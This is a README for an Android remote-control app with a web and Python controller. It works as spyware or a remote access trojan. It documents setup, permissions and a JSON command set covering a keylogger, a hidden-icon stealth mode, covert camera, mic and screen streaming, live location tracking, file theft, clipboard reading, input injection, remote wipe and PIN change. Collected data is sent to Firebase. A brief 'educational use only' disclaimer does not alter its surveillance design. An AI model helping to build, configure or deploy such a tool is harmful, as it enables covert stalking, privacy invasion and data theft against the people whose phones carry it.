# Advanced Phone Control & Monitoring System

A comprehensive Android device control and monitoring system with extensive remote management capabilities, including camera control, device automation, security features, and real-time monitoring.

## 🚀 Features Overview

### 📸 Camera & Media Features
- **Take Picture**: Capture photos using front or back camera
- **Stream Camera**: Live camera streaming with real-time video feed
- **Record Audio**: Record microphone audio and upload to Firebase Storage
- **Stream Mic**: Real-time audio streaming via WebSocket
- **Screenshot**: Capture screen and upload to cloud storage
- **Screen Record**: Start/stop screen recording with video output

### 🛰️ Location & Device Info
- **Get Location**: Retrieve GPS or network-based location
- **Live Tracking**: Continuously send location updates every X seconds
- **Device Info**: Get comprehensive device information including:
  - Battery percentage and status
  - Network connectivity status
  - Installed applications list
  - Storage usage statistics
  - Device hardware specifications

### 📱 Control & Automation
- **Launch App**: Open any installed application by package name
- **Close App**: Force stop applications (requires root or accessibility service)
- **Open URL**: Launch browser with specified URL
- **Lock Device**: Immediately lock the device (requires admin permission)
- **Toggle WiFi/Bluetooth**: Enable/disable wireless connections
- **Vibrate**: Trigger device vibration for specified duration
- **Show Toast**: Display remote toast messages on device

### 💾 File & Storage Management
- **List Files**: Browse directory contents
- **Read File**: Read file contents and return data
- **Write File**: Create or modify files on device
- **Delete File**: Remove files from device storage
- **Download File**: Download files from URLs to device
- **Upload File**: Upload local files to Firebase Storage

### 🔑 Remote Access & System Control
- **Shutdown/Reboot**: System power management (requires root/admin)
- **Keylogger**: Record keystrokes using accessibility services
- **Clipboard Read/Write**: Access and modify clipboard content
- **Input Injection**: Simulate touch, tap, swipe, and text input
- **Brightness Control**: Adjust screen brightness levels
- **Volume Control**: Modify media volume settings

### 🔐 Security & Anti-Theft Features
- **Wipe Data**: Factory reset device (requires admin permission)
- **Change PIN**: Modify device lock screen PIN
- **Lock App**: Prevent specific applications from launching
- **Stealth Mode**: Hide application icon from launcher

## Project Structure

```
├── app/                          # Android application
│   ├── src/main/java/com/example/foregroundservice/
│   │   ├── MainActivity.java              # Main activity with permission handling
│   │   ├── MyForegroundService.java       # Core service with command processing
│   │   ├── MyAccessibilityService.java    # Accessibility service for advanced features
│   │   ├── DeviceAdminReceiver.java       # Device admin for system controls
│   │   ├── DeviceControlManager.java      # Comprehensive device control manager
│   │   ├── ScreenCaptureService.java      # Screen capture and recording
│   │   ├── BootReceiver.java              # Auto-start on boot
│   │   └── SystemEventReceiver.java       # System event handling
│   ├── src/main/res/
│   │   ├── xml/
│   │   │   ├── accessibility_service_config.xml  # Accessibility service config
│   │   │   └── device_admin.xml                   # Device admin policies
│   │   └── values/
│   │       └── strings.xml                         # String resources
│   └── build.gradle.kts                           # Build configuration
├── web-controller/               # Node.js web interface
├── command_sender.py             # Python command sender
└── README.md                     # This documentation
```

## 🛠️ Setup Instructions

### Prerequisites

#### For Android Development
- Android Studio Arctic Fox or later
- Android SDK (API level 26+)
- Java 8 or higher
- Gradle 7.0+

#### For Web Controller
- Node.js 16+ and npm
- Firebase project with Realtime Database and Storage

#### For Python Script
- Python 3.7+
- Firebase Admin SDK

### 1. Android App Setup

1. **Configure Android SDK**
   ```bash
   cp local.properties.example local.properties
   # Edit local.properties with your Android SDK path
   ```

2. **Firebase Configuration**
   - Create Firebase project at https://console.firebase.google.com
   - Enable Realtime Database and Storage
   - Download `google-services.json` to `app/` directory
   - Configure Firebase security rules

3. **Build and Install**
   ```bash
   ./gradlew build
   ./gradlew installDebug
   ```

### 2. Permission Setup

The app requires extensive permissions for full functionality:

#### Required Permissions
- **Location**: `ACCESS_FINE_LOCATION`, `ACCESS_COARSE_LOCATION`, `ACCESS_BACKGROUND_LOCATION`
- **Media**: `CAMERA`, `RECORD_AUDIO`, `FOREGROUND_SERVICE_MEDIA_PROJECTION`
- **Storage**: `READ_EXTERNAL_STORAGE`, `WRITE_EXTERNAL_STORAGE`, `MANAGE_EXTERNAL_STORAGE`
- **Network**: `INTERNET`, `ACCESS_WIFI_STATE`, `CHANGE_WIFI_STATE`
- **Bluetooth**: `BLUETOOTH`, `BLUETOOTH_ADMIN`, `BLUETOOTH_SCAN`, `BLUETOOTH_CONNECT`
- **System**: `VIBRATE`, `SYSTEM_ALERT_WINDOW`, `WRITE_SETTINGS`, `MODIFY_AUDIO_SETTINGS`
- **Device Admin**: `BIND_DEVICE_ADMIN`, `WIPE_DATA`, `SHUTDOWN`, `REBOOT`
- **Accessibility**: `BIND_ACCESSIBILITY_SERVICE`

#### Special Permissions
- **Device Admin**: Grant through system settings
- **Accessibility Service**: Enable in Settings > Accessibility
- **Overlay Permission**: Allow drawing over other apps
- **Usage Stats**: Grant for app monitoring

### 3. Web Controller Setup

```bash
cd web-controller
npm install
cp .env.example .env
# Edit .env with Firebase credentials
npm start
```

### 4. Python Command Sender Setup

```bash
pip install firebase-admin
cp firebase-credentials.json.example firebase-credentials.json
# Edit with Firebase service account key
python command_sender.py
```

## 📡 Command Reference

### Camera & Media Commands

```json
{
  "action": "TAKE_PICTURE",
  "params": {
    "camera": "back"  // "front" or "back"
  }
}

{
  "action": "STREAM_CAMERA",
  "params": {
    "quality": "720p",
    "fps": 15
  }
}

{
  "action": "RECORD_AUDIO",
  "params": {
    "duration": 30000,  // milliseconds
    "upload": true
  }
}

{
  "action": "SCREEN_RECORD",
  "params": {
    "action": "start"  // "start" or "stop"
  }
}
```

### Location & Device Info Commands

```json
{
  "action": "GET_LOCATION",
  "params": {
    "accuracy": "high"  // "high" or "low"
  }
}

{
  "action": "LIVE_TRACKING",
  "params": {
    "interval": 30,  // seconds
    "enabled": true
  }
}

{
  "action": "GET_DEVICE_INFO",
  "params": {}
}
```

### Control & Automation Commands

```json
{
  "action": "LAUNCH_APP",
  "params": {
    "package": "com.whatsapp"
  }
}

{
  "action": "OPEN_URL",
  "params": {
    "url": "https://example.com"
  }
}

{
  "action": "LOCK_DEVICE",
  "params": {}
}

{
  "action": "TOGGLE_WIFI",
  "params": {
    "enable": true
  }
}

{
  "action": "VIBRATE",
  "params": {
    "duration": 1000  // milliseconds
  }
}

{
  "action": "SHOW_TOAST",
  "params": {
    "message": "Hello from remote!"
  }
}
```

### File & Storage Commands

```json
{
  "action": "LIST_FILES",
  "params": {
    "path": "/storage/emulated/0/Download"
  }
}

{
  "action": "READ_FILE",
  "params": {
    "path": "/path/to/file.txt"
  }
}

{
  "action": "WRITE_FILE",
  "params": {
    "path": "/path/to/file.txt",
    "content": "File content here"
  }
}

{
  "action": "DELETE_FILE",
  "params": {
    "path": "/path/to/file.txt"
  }
}

{
  "action": "DOWNLOAD_FILE",
  "params": {
    "url": "https://example.com/file.pdf",
    "local_path": "/storage/emulated/0/Download/file.pdf"
  }
}

{
  "action": "UPLOAD_FILE",
  "params": {
    "path": "/storage/emulated/0/Download/file.pdf"
  }
}
```

### Remote Access & System Commands

```json
{
  "action": "KEYLOGGER",
  "params": {
    "action": "start"  // "start" or "stop"
  }
}

{
  "action": "CLIPBOARD_READ",
  "params": {}
}

{
  "action": "CLIPBOARD_WRITE",
  "params": {
    "text": "Text to copy to clipboard"
  }
}

{
  "action": "INJECT_INPUT",
  "params": {
    "type": "tap",  // "tap", "swipe", or "text"
    "x": 500,
    "y": 300
  }
}

{
  "action": "INJECT_INPUT",
  "params": {
    "type": "swipe",
    "startX": 100,
    "startY": 200,
    "endX": 300,
    "endY": 400,
    "duration": 500
  }
}

{
  "action": "INJECT_INPUT",
  "params": {
    "type": "text",
    "text": "Hello World"
  }
}

{
  "action": "SET_BRIGHTNESS",
  "params": {
    "brightness": 150  // 0-255
  }
}

{
  "action": "SET_VOLUME",
  "params": {
    "volume": 50  // 0-100
  }
}
```

### Security Commands

```json
{
  "action": "WIPE_DATA",
  "params": {}
}

{
  "action": "CHANGE_PIN",
  "params": {
    "pin": "1234"
  }
}
```

## 🔒 Security Considerations

### Permission Requirements
- **Device Admin**: Required for system-level controls (lock, wipe, reboot)
- **Accessibility Service**: Required for keylogging and input injection
- **Root Access**: Required for some advanced features (app closing, system controls)

### Data Privacy
- All data is transmitted through Firebase (encrypted in transit)
- Local storage permissions required for file operations
- Location data can be sensitive - use responsibly

### Legal Compliance
- **Educational Use Only**: This system is designed for educational purposes
- **Local Laws**: Ensure compliance with local privacy and surveillance laws
- **Consent Required**: Always obtain proper consent before monitoring devices
- **Data Protection**: Implement appropriate data protection measures

## 🐛 Troubleshooting

### Common Issues

1. **Permission Denied Errors**
   - Ensure all permissions are granted in Android settings
   - Check device admin and accessibility service status
   - Verify overlay permission for screen capture

2. **Firebase Connection Issues**
   - Verify `google-services.json` configuration
   - Check Firebase project settings and security rules
   - Ensure proper network connectivity

3. **Service Not Starting**
   - Check battery optimization settings
   - Verify auto-start permissions (device-specific)
   - Review logcat for detailed error messages

4. **Feature Not Working**
   - Verify required permissions are granted
   - Check if device admin is active
   - Ensure accessibility service is enabled

### Debug Mode
Enable debug logging by setting `BuildConfig.DEBUG = true` in build configuration.

## 📊 Firebase Database Structure

```
/commands/{userId}                    # Commands sent to devices
/command_responses/{userId}           # Responses from devices
/locations/{userId}                   # Device location data
/device_status/{userId}               # Device status information
/audio_stream/{userId}                # Audio stream data
/camera_stream/{userId}               # Camera stream data
/screen_stream/{userId}               # Screen capture data
/recordings/{userId}                  # Recorded files
/accessibility_events/{userId}        # Accessibility service events
/keylog_data/{userId}                 # Keylogger data
/file_events/{userId}                 # File operation events
/app_events/{userId}                  # App launch/close events
/network_events/{userId}              # WiFi/Bluetooth events
/security_events/{userId}             # Security-related events
/system_events/{userId}               # System control events
/service_status/{userId}              # Service status updates
/admin_status/{userId}                # Device admin status
```

## 📝 License

This project is provided for **educational purposes only**. Users are responsible for ensuring compliance with all applicable laws and regulations regarding privacy, surveillance, and data protection in their jurisdiction.

## ⚠️ Disclaimer

This software is designed for educational and research purposes. Users must:
- Obtain proper consent before monitoring any device
- Comply with all applicable privacy and surveillance laws
- Use responsibly and ethically
- Not use for malicious purposes

The developers are not responsible for any misuse of this software.